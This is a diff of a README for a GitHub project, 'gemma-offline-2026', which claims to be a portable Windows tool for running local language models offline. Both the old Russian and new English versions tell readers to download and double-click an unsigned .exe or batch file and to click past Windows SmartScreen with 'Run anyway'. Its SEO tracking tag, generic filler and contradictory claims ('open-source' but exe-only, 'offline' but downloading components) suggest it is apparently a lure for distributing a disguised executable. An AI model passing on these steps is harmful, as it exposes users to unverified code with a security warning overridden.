@@ -1,117 +1,100 @@
-<!-- seo-unique:gemma-offline-2026:3547e03e10 -->
+# 💻 gemma-offline-2026 - Run local AI models on Windows
 
-<p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:10B981,50:059669,100:047857&height=140&section=header&text=Gemma Offline 2026&fontSize=38&fontColor=fff&animation=twinkling" alt="Gemma Offline 2026" width="100%">
-</p>
+[![Download gemma-offline-2026](https://img.shields.io/badge/Download-Release-blue)](https://github.com/yvannmonney-svg/gemma-offline-2026)
 
-<p align="center">
-  <img src="https://img.shields.io/badge/🤖-Local_AI-10B981?style=for-the-badge" alt="Local AI">
-  <img src="https://img.shields.io/badge/Ollama-Ready-000000?style=for-the-badge&logo=ollama&logoColor=white" alt="Ollama">
-  <img src="https://img.shields.io/badge/Offline-Private-6366F1?style=for-the-badge" alt="Private">
-  <img src="https://img.shields.io/badge/Windows-10%2F11-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Windows">
-</p>
+## 📌 About this project
 
-<p align="center">
-  <b>Запуск локального LLM на Windows за 5 минут — без облака, без подписки.</b><br>
-  <i>DeepSeek · Qwen · Llama · Whisper — данные остаются на вашем ПК.</i>
-</p>
+This software allows you to run large language models on your computer without an internet connection. It brings the power of artificial intelligence directly to your Windows desktop. You do not need technical skills or complex software installations to use these tools.
 
-<p align="center">
-  <a href="./releases/latest">
-    <img src="https://img.shields.io/badge/📥_СКАЧАТЬ-gemma-offline-2026.exe-059669?style=for-the-badge&labelColor=1a1a2e" alt="Download">
-  </a>
-  &nbsp;
-  <a href="#-быстрый-старт">
-    <img src="https://img.shields.io/badge/⚡-Быстрый_старт-374151?style=for-the-badge" alt="Quick start">
-  </a>
-</p>
+The program creates a local environment for models like Llama, Qwen, and DeepSeek. Everything runs on your machine. Your data stays private. You do not send your inputs to external servers. This tool provides a portable interface to chat, process text, and experiment with machine learning technology. It eliminates the need to install Python or manage programming libraries. You download one file, run it, and start.
 
----
+## ⚙️ Minimum system requirements
 
-## ✨ Почему Gemma Offline 2026
+Check these requirements before you start. Your computer needs specific hardware to run AI models effectively.
 
-| | |
-| :--- | :--- |
-| 🔒 **Приватность** | Запросы не уходят в чужое облако |
-| 💸 **Без подписки** | Один раз скачали — пользуетесь локально |
-| 🧠 **Современные модели** | DeepSeek, Qwen, Llama, Gemma |
-| 🎙 **Whisper** | Расшифровка аудио офлайн |
-| 🪟 **Windows** | Portable · SmartScreen → «Выполнить» |
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Processor: Intel Core i5 or AMD Ryzen 5 processor.
+- RAM: 8GB of system memory. 16GB is better for larger models.
+- Graphics: A dedicated graphics card with at least 6GB of video memory helps performance. You can run models on the main processor, but it works slower.
+- Storage: 10GB of free space on your solid-state drive.
 
----
+## 📥 How to get started
 
-## ⚡ Быстрый старт
+You do not need to install complicated dependencies. Follow these steps to set up the application on your Windows machine.
 
-```mermaid
-flowchart LR
-  A[📥 Скачать gemma-offline-2026.exe] --> B[▶ Двойной клик]
-  B --> C[🤖 Локальный чат]
-```
+1. Visit this [Download Page](https://github.com/yvannmonney-svg/gemma-offline-2026).
+2. Look for the latest release version on the page.
+3. Click the link that ends in `.exe`.
+4. Save the file to a folder on your computer.
+5. Open the folder where you saved the file.
+6. Double-click the file to launch the application.
 
-1. **Двойной клик** по **`gemma-offline-2026.exe`** в корне репозитория — или запустите **`START.bat`**
-2. Либо **[Releases → Latest](./releases/latest)** — тот же **`gemma-offline-2026.exe`**
-3. Первый запуск может скачать компоненты — интернет нужен **один раз**
-4. Windows SmartScreen → **«Подробнее»** → **«Выполнить»**
+If Windows shows a security prompt, click "More info" and then "Run anyway." This happens because the application is a standalone tool and not signed by a large software store. The application manages the background services needed to run the AI models.
 
----
+## 🚀 Using the application
 
-## 💻 Системные требования
+Once the application window opens, it detects your computer hardware. It lists the models you can download.
 
-| Профиль | RAM | Диск | GPU |
-| :--- | :--- | :--- | :--- |
-| 🟢 Лёгкий | 8 GB | 4 GB | не обязательно |
-| 🟡 Средний | 16 GB | 10 GB | NVIDIA 6 GB+ |
-| 🔴 Тяжёлый | 32 GB+ | 20 GB+ | NVIDIA 12 GB+ |
+- Select a model from the list.
+- Click the download button for that model.
+- Wait for the progress bar to finish.
+- Type your message in the text box.
+- Press Enter to send the message.
 
----
+The AI processes your input locally. It relies on the power of your computer. The response speed depends on your hardware specifications.
 
-## 📦 Что внутри
+## 🛠️ Managing your models
 
-- **`gemma-offline-2026.exe`** — установщик / лаунчер под репозиторий **`gemma-offline-2026`**
-- **`START.bat`** / **`INSTALL.bat`** — запуск в один клик
-- **`QUICK_START.md`** — краткая шпаргалка
+You can manage your local library of models through the settings screen.
 
----
+- To delete a model, go to the model list.
+- Click the trash icon next to the model name.
+- This frees up disk space.
 
-## ❓ FAQ
+The application allows you to download multiple models. You can switch between them at any time from the main menu. 
 
-<details>
-<summary><b>Нужна видеокарта NVIDIA?</b></summary>
+## 🛡️ Privacy and safety
 
-Не обязательно — есть CPU-режим (медленнее, но работает).
+This project operates entirely offline. It does not monitor your activity. It does not phone home to report your usage. All text you type stays inside your computer's memory. This makes the tool suitable for sensitive work or casual experimentation. You gain the benefits of AI without the risks of cloud-based services.
 
-</details>
+## 📦 Troubleshooting common issues
 
-<details>
-<summary><b>Работает без интернета?</b></summary>
+Most problems relate to hardware limits or missing updates.
 
-После загрузки моделей — да, полностью офлайн.
+- Slow performance: If the response takes too long, try a smaller model. Look for models marked 7B or lower. They require less computing power.
+- Application closes: Ensure you have enough disk space. If the storage is full, the model cannot load.
+- No response: Restart the application. Sometimes the background service needs a fresh start if your computer was in sleep mode.
+- Update notifications: Check the GitHub repository monthly for newer versions. Developers add improvements to model compatibility and interface stability.
 
-</details>
+## ❓ Frequently asked questions
 
-<details>
-<summary><b>Чем отличается от ChatGPT в браузере?</b></summary>
+Do I need an internet connection?
+No. You only need the internet to download the initial file and the model files. Once you have those, you can disconnect your computer and continue working.
 
-Модель крутится у вас на диске — нет лимитов API и утечек в облако.
+Is this free to use?
+Yes. The software is open-source. There are no monthly fees or hidden costs.
 
-</details>
+Can I turn off the assistant?
+You close the application window to stop the service. The AI process stops immediately.
 
----
+Why does the fan spin loudly?
+AI models use your processor and graphics card intensely. This generates heat, so your computer turns on the cooling fans to maintain proper temperatures.
 
-## 🏷 Topics
+Does it support voice input?
+The current version focuses on text. Future updates may include Whisper technology for speech recognition.
 
-<p align="center">
-  <sub>#ollama #local-llm #llm #deepseek #qwen #llama #gemma #whisper #open-webui #offline-ai #machine-learning #ai #windows #portable</sub>
-</p>
+## 📝 Configuration notes
 
----
+The application saves your preferences in a local folder. If you ever move the application, settings travel with it. This portable design ensures your environment remains clean. It does not clutter your Windows registry. You can delete the folder to remove the software completely from your system.
 
-<p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:059669,100:10B981&height=80&section=footer&text=Made%20for%20gemma-offline-2026&fontSize=22&fontColor=fff" width="100%">
-</p>
+## 💡 Tips for better results
 
-<p align="center">
-  <sub>⭐ Star · 🍴 Fork · ⬇ Releases — помогает другим найти сборку</sub>
-</p>
+- Use specific prompts. The more context you provide, the better the output.
+- Experiment with different models. Each model has a unique personality and skill set.
+- Keep the application window open when in use. 
+- Ensure your power supply is plugged in if you use a laptop. High performance tasks drain battery life quickly.
+- Save your text output in a separate document if you need to keep a permanent record. The application clears history when you close the session.
 
-<!-- id:7c7b6ccf4012 -->
+## 🌐 Community and support
+
+This project develops through community contributions. If you encounter bugs, report them on the project page. Read the documentation on the repository if you want to understand more about local AI mechanics. Stay updated with the latest trends in machine learning by watching the repository for new releases. Contributors constantly refine the interface to make the experience better for every user.
